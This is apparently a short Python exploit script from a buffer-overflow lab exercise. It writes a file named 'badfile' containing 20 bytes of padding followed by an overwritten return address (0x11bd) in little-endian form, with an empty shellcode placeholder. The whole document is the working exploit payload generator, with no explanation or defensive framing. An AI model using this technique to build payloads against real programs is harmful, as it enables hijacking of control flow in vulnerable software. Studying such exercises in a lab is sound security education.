import sys

shellcode = b''

content = bytearray(b'a'*20)

# content += b"dead"

ret = 0x000011bd

content += (ret).to_bytes(4, byteorder='little')

print(content)

with open('badfile', 'wb') as f:
    f.write(content)
    
print("badfile created")
